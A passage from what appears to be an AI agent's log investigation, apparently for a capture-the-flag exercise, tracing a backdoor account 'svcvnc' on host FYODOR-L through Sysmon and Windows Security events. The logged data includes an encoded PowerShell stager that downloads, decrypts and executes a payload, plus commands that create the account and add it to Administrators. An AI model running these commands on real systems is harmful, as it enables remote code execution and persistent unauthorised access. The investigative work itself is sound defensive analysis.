AC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAYQBEAEUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAdABoAEEAVgBnAHMAPQBoAEIAMgBIADAARwBUAEkAcAB3AHgAQwBlAEwAaABHAGUALwBmAEwAawBmAEIAcABDAGQASQA9ACIAKQA7ACQAZABhAFQAQQA9ACQAdwBDAC4ARABPAFcAbgBsAG8AQQBkAEQAQQB0AEEAKAAkAHMARQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABBAFQAQQBbADAALgAuADMAXQA7ACQARABhAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAEcAVABIAF0AOwAtAGoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA</Data></EventData></Event>\"}, {\"_time\": \"2018-08-20T18:08:17.000+08:00\", \"_raw\": \"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-20T10:08:17.261134000Z'/><EventRecordID>31963</EventRecordID><Correlation/><Execution ProcessID='10440' ThreadID='2904'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>FYODOR-L.froth.ly</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2018-08-20 10:08:17.254</Data><Data Name='ProcessGuid'>{EBF7A186-C489-5B58-0000-0010C2E7D901}</Data><Data Name='ProcessId'>8116</Data><Data Name='Image'>C:\\\\Windows\\\\System32\\\\net1.exe</Data><Data Name='FileVersion'>10.0.17134.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Net Command</Data><Data Name='Product'>Microsoft\\u00ae Windows\\u00ae Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='CommandLine'>C:\\\\Windows\\\\system32\\\\net1 user /add svcvnc Password123!</Data><Data Name='CurrentDirectory'>C:\\\\Windows\\\\system32\\\\</Data><Data Name='User'>AzureAD\\\\FyodorMalteskesko</Data><Data Name='LogonGuid'>{EBF7A186-8503-5B57-0000-0020981C0901}</Data><Data Name='LogonId'>0x1091c98</Data><Data Name='TerminalSessionId'>3</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888</Data><Data Name='ParentProcessGuid'>{EBF7A186-C489-5B58-0000-001059E6D901}</Data><Data Name='ParentProcessId'>9800</Data><Data Name='ParentImage'>C:\\\\Windows\\\\System32\\\\net.exe</Data><Data Name='ParentCommandLine'>\\\"C:\\\\Windows\\\\system32\\\\net.exe\\\" user /add svcvnc Password123!</Data></EventData></Event>\"}, {\"_time\": \"2018-08-20T18:08:17.000+08:00\", \"_raw\": \"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-20T10:08:17.247171200Z'/><EventRecordID>31962</EventRecordID><Correlation/><Execution ProcessID='10440' ThreadID='2904'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>FYODOR-L.froth.ly</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2018-08-20 10:08:17.242</Data><Data Name='ProcessGuid'>{EBF7A186-C489-5B58-0000-001059E6D901}</Data><Data Name='ProcessId'>9800</Data><Data Name='Image'>C:\\\\Windows\\\\System32\\\\net.exe</Data><Data Na... [truncated — use a more specific query]\"}",
          "name": "get_raw_events"
        },
        {
          "type": "AIMessage",
          "content": "Intention: I found the key Sysmon events. The group targeted is **administrators**. Let me also check the WinEventLog sourcetype for any additional group membership events (e.g., Windows Security log Event ID 4732 for group membership changes) to get a complete picture.",
          "tool_calls": [
            {
              "name": "get_raw_events",
              "args": {
                "keyword": "svcvnc",
                "limit": 15,
                "sourcetype": "WinEventLog"
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"results\": [{\"_time\": \"2018-08-20T18:08:35.000+08:00\", \"_raw\": \"08/19/2018 22:08:35 PM\\nLogName=Security\\nSourceName=Microsoft Windows security auditing.\\nEventCode=4732\\nEventType=0\\nType=Information\\nComputerName=FYODOR-L.froth.ly\\nTaskCategory=Security Group Management\\nOpCode=Info\\nRecordNumber=277584\\nKeywords=Audit Success\\nMessage=A member was added to a security-enabled local group.\\n\\nSubject:\\n\\tSecurity ID:\\t\\tAzureAD\\\\FyodorMalteskesko\\n\\tAccount Name:\\t\\tFyodorMalteskesko\\n\\tAccount Domain:\\t\\tAzureAD\\n\\tLogon ID:\\t\\t0x1091C98\\n\\nMember:\\n\\tSecurity ID:\\t\\tFYODOR-L\\\\svcvnc\\n\\tAccount Name:\\t\\t-\\n\\nGroup:\\n\\tSecurity ID:\\t\\tBUILTIN\\\\Administrators\\n\\tGroup Name:\\t\\tAdministrators\\n\\tGroup Domain:\\t\\tBuiltin\\n\\nAdditional Information:\\n\\tPrivileges:\\t\\t-\"}, {\"_time\": \"2018-08-20T18:08:35.000+08:00\", \"_raw\": \"08/19/2018 22:08:35 PM\\nLogName=Security\\nSourceName=Microsoft Windows security auditing.\\nEventCode=4688\\nEventType=0\\nType=Information\\nComputerName=FYODOR-L.froth.ly\\nTaskCategory=Process Creation\\nOpCode=Info\\nRecordNumber=277583\\nKeywords=Audit Success\\nMessage=A new process has been created.\\n\\nCreator Subject:\\n\\tSecurity ID:\\t\\tAzureAD\\\\FyodorMalteskesko\\n\\tAccount Name:\\t\\tFyodorMalteskesko\\n\\tAccount Domain:\\t\\tAzureAD\\n\\tLogon ID:\\t\\t0x1091C98\\n\\nTarget Subject:\\n\\tSecurity ID:\\t\\tNULL SID\\n\\tAccount Name:\\t\\t-\\n\\tAccount Domain:\\t\\t-\\n\\tLogon ID:\\t\\t0x0\\n\\nProcess Information:\\n\\tNew Process ID:\\t\\t0x1664\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\net1.exe\\n\\tToken Elevation Type:\\t%%1937\\n\\tMandatory Label:\\t\\tMandatory Label\\\\High Mandatory Level\\n\\tCreator Process ID:\\t0x1d6c\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\net.exe\\n\\tProcess Command Line:\\tC:\\\\Windows\\\\system32\\\\net1 localgroup administrators svcvnc /add\\n\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\n\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\n\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\n\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"}, {\"_time\": \"2018-08-20T18:08:35.000+08:00\", \"_raw\": \"08/19/2018 22:08:35 PM\\nLogName=Security\\nSourceName=Microsoft Windows security auditing.\\nEventCode=4688\\nEventType=0\\nType=Information\\nComputerName=FYODOR-L.froth.ly\\nTaskCategory=Process Creation\\nOpCode=Info\\nRecordNumber=277582\\nKeywords=Audit Success\\nMessage=A new process has been created.\\n\\nCreator Subject:\\n\\tSecurity ID:\\t\\tAzureAD\\\\FyodorMalteskesko\\n\\tAccount Name:\\t\\tFyodorMalteskesko\\n\\tAccount Domain:\\t\\tAzureAD\\n\\tLogon ID:\\t\\t0x1091C98\\n\\nTarget Subject:\\n\\tSecurity ID:\\t\\tNULL SID\\n\\tAccount Name:\\t\\t-\\n\\tAccount Domain:\\t\\t-\\n\\tLogon ID:\\t\\t0x0\\n\\nProcess Information:\\n\\tNew Process ID:\\t\\t0x1d6c\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\net.exe\\n\\tToken Elevation Type:\\t%%1937\\n\\tMandatory Label:\\t\\tMandatory Label\\\\High Mandatory Level\\n\\tCreator Process ID:\\t0x18d8\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\n\\tProcess Command Line:\\t\\\"C:\\\\Windows\\\\system32\\\\net.exe\\\" localgroup administrators svcvnc /add\\n\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\n\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\n\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\n\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"}, {\"_time\": \"2018-08-20T18:08:17.000+08:00\", \"_raw\": \"08/19/2018 22:08:17 PM\\nLogName=Security\\nSourceName=Microsoft Windows security auditing.\\nEventCode=4732\\nEventType=0\\nType=Information\\nComputerName=FYODOR-L.froth.ly\\nTaskCategory=Security Group Management\\nOpCode=Info\\nRecordNumber=277565\\nKeywords=Audit Success\\nMessage=A member was added to a security-enabled local group.\\n\\nSubject:\\n\\tSecurity ID:\\t\\tAzureAD\\\\FyodorMalteskesko\\n\\tAccount Name:\\t\\tFyodorMalteskesko\\n\\tAccount Domain:\\t\\tAzureAD\\n\\tLogon ID:\\t\\t0x1091C98\\n\\nMember:\\n\\tSecurity ID:\\t\\tFYODOR-L\\\\svcvnc\\n\\tAccount Name:\\t\\t-\\n\\nGroup:\\n\\tSecurity ID:\\t\\tBUILTIN\\\\Users\\n\\tGroup Name:\\t\\tUsers\\n\\tGroup Domain:\\t\\tBuiltin\\n\\nAdditional Information:\\n\\tPrivileges:\\t\\t-\"}, {\"_time\": \"2018-08-20T18:08:17.000+08:00\", \"_raw\": \"08/19/2018 22:08:17 PM\\nLogName=Security\\nSourceName=Microsoft Windows security auditing.\\nEventCode=4724\\nEventType=0\\nType=Information\\nComputerName=FYODOR-L.froth.ly\\nTaskCategory=User Account Management\\nOpCode=Info\\nRecordNumber=277564\\nKeywords=Audit Success\\nMessage=An attempt was made to reset an account's password.\\n\\nSubject:\\n\\tSecurity ID:\\t\\tAzureAD\\\\FyodorMalteskesko\\n\\tAccount Name:\\t\\tFyodorMalteskesko\\n\\tAccount Domain:\\t\\tAzureAD\\n\\tLogon ID:\\t\\t0x1091C98\\n\\nTarget Account:\\n\\tSecurity ID:\\t\\tFYODOR-L\\\\svcvnc\\n\\tAccount Name:\\t\\tsvcvnc\\n\\tAccount Domain:\\t\\tFYODOR-L\"}, {\"_time\": \"2018-08-20T18:08:17.000+08:00\", \"_raw\": \"08/19/2018 22:08:17 PM\\nLogName=Security\\nSourceName=Microsoft Windows security auditing.\\nEventCode=4738\\nEventType=0\\nType=Information\\nComputerName=FYODOR-L.froth.ly\\nTaskCategory=User Account Management\\nOpCode=Info\\nRecordNumber=277563\\nKeywords=Audit Success\\nMessage=A user account was changed.\\n\\nSubject:\\n\\tSecurity ID:\\t\\tAzureAD\\\\FyodorMalteskesko\\n\\tAccount Name:\\t\\tFyodorMalteskesko\\n\\tAccount Domain:\\t\\tAzureAD\\n\\tLogon ID:\\t\\t0x1091C98\\n\\nTarget Account:\\n\\tSecurity ID:\\t\\tFYODOR-L\\\\svcvnc\\n\\tAccount Name:\\t\\tsvcvnc\\n\\tAccount Domain:\\t\\tFYODOR-L\\n\\nChanged Attributes:\\n\\tSAM Account Name:\\tsvcvnc\\n\\tDisplay Name:\\t\\t<value not set>\\n\\tUser Principal Name:\\t-\\n\\tHome Directory:\\t\\t<value not set>\\n\\tHome Drive:\\t\\t<value not set>\\n\\tScript Path:\\t\\t<value not set>\\n\\tProfile Path:\\t\\t<value not set>\\n\\tUser Workstations:\\t<value not set>\\n\\tPassword Last Set:\\t7/25/2018 6:42:17 PM\\n\\tAccount Expires:\\t\\t<never>\\n\\tPrimary Group ID:\\t513\\n\\tAllowedToDelegateTo:\\t-\\n\\tOld UAC Value:\\t\\t0x15\\n\\tNew UAC Value:\\t\\t0x10\\n\\tUser Account Control:\\t\\n\\t\\tAccount Enabled\\n\\t\\t'Password Not Required' - Disabled\\n\\tUser Parameters:\\t-\\n\\tSID History:\\t\\t-\\n\\tLogon Hours:\\t\\tAll\\n\\nAdditional Information:\\n\\tPrivileges:\\t\\t-\"}, {\"_time\": \"2018-08-20T18:08:17.000+08:00\", \"_raw\": \"08/19/2018 22:08:17 PM\\nLogName=Security\\nSourceName=Microsoft Windows security auditing.\\nEventCode=4722\\nEventType=0\\nType=Information\\nComputerName=FYODOR-L.froth.ly\\nTaskCategory=User Account Management\\nOpCode=Info\\nRecordNumber=277562\\nKeywords=Audit Success\\nMessage=A user account was enabled.\\n\\nSubject:\\n\\tSecurity ID:\\t\\tAzureAD\\\\FyodorMalteskesko\\n\\tAccount Name:\\t\\tFyodorMalteskesko\\n\\tAccount Domain:\\t\\tAzureAD\\n\\tLogon ID:\\t\\t0x1091C98\\n\\nTarget Account:\\n\\tSecurity ID:\\t\\tFYODOR-L\\\\svcvnc\\n\\tAccount Name:\\t\\tsvcvnc\\n\\tAccount Domain:\\t\\tFYODOR-L\"}, {\"_time\": \"2018-08-20T18:08:17.000+08:00\", \"_raw\": \"08/19/2018 22:08:17 PM\\nLogName=Security\\nSourceName=Microsoft Windows security auditing.\\nEventCode=4720\\nEventType=0\\nType=Information\\nComputerName=FYODOR-L.froth.ly\\nTaskCategory=User Account Management\\nOpCode=Info\\nRecordNumber=277561\\nKeywords=Audit Success\\nMessage=A user account was created.\\n\\nSubject:\\n\\tSecurity ID:\\t\\tAzureAD\\\\FyodorMalteskesko\\n\\tAccount Name:\\t\\tFyodorMalteskesko\\n\\tAccount Domain:\\t\\tAzureAD\\n\\tLogon ID:\\t\\t0x1091C98\\n\\nNew Account:\\n\\tSecurity ID:\\t\\tFYODOR-L\\\\svcvnc\\n\\tAccount Name:\\t\\tsvcvnc\\n\\tAccount Domain:\\t\\tFYODOR-L\\n\\nAttributes:\\n\\tSAM Account Name:\\tsvcvnc\\n\\tDisplay Name:\\t\\t<value not set>\\n\\tUser Principal Name:\\t-\\n\\tHome Directory:\\t\\t<value not set>\\n\\tHome Drive:\\t\\t<value not set>\\n\\tScript Path:\\t\\t<value not set>\\n\\tProfile Path:\\t\\t<value not set>\\n\\tUser Workstations:\\t<value not set>\\n\\tPassword Last Set:\\t<never>\\n\\tAccount Expires:\\t\\t<never>\\n\\tPrimary Group ID:\\t513\\n\\tAllowed To Delegate To:\\t-\\n\\tOld UAC Value:\\t\\t0x0\\n\\tNew UAC Value:\\t\\t0x15\\n\\tUser Account Control:\\t\\n\\t\\tAccount Disabled\\n\\t\\t'Password Not Required' - Enabled\\n\\t\\t'Normal Account' - Enabled\\n\\tUser Parameters:\\t<value not set>\\n\\tSID History:\\t\\t-\\n\\tLogon Hours:\\t\\tAll\\n\\nAdditional Information:\\n\\tPrivileges\\t\\t-\"}, {\"_time\": \"2018-08-20T18:08:17.000+08:00\", \"_raw\": \"08/19/2018 22:08:17 PM\\nLogName=Security\\nSourceName=Microsoft Windows security auditing.\\nEventCode=4728\\nEventType=0\\nType=Information\\nComputerName=FYODOR-L.froth.ly\\nTaskCategory=Security Group Management\\nOpCode=Info\\nRecordNumber=277560\\nKeywords=Audit Success\\nMessage=A member was added to a security-enabled global group.\\n\\nSubject:\\n\\tSecurity ID:\\t\\tAzureAD\\\\FyodorMalteskesko\\n\\tAccount Name:\\t\\tFyodorMalteskesko\\n\\tAccount Domain:\\t\\tAzureAD\\n\\tLogon ID:\\t\\t0x1091C98\\n\\nMember:\\n\\tSecurity ID:\\t\\tFYODOR-L\\\\svcvnc\\n\\tAccount Name:\\t\\t-\\n\\nGroup:\\n\\tSecurity ID:\\t\\tFYODOR-L\\\\None\\n\\tGroup Name:\\t\\tNone\\n\\tGroup Domain:\\t\\tFYODOR-L\\n\\nAdditional Information:\\n\\tPrivileges:\\t\\t-\"}, {\"_time\": \"2018-08-20T18:08:17.000+08:00\", \"_raw\": \"08/19/2018 22:08:17 PM\\nLogName=Security\\nSourceName=Microsoft Windows security auditing.\\nEventCode=4688\\nEventType=0\\nType=Information\\nComputerName=FYODOR-L.froth.ly\\nTaskCategory=Process Creation\\nOpCode=Info\\n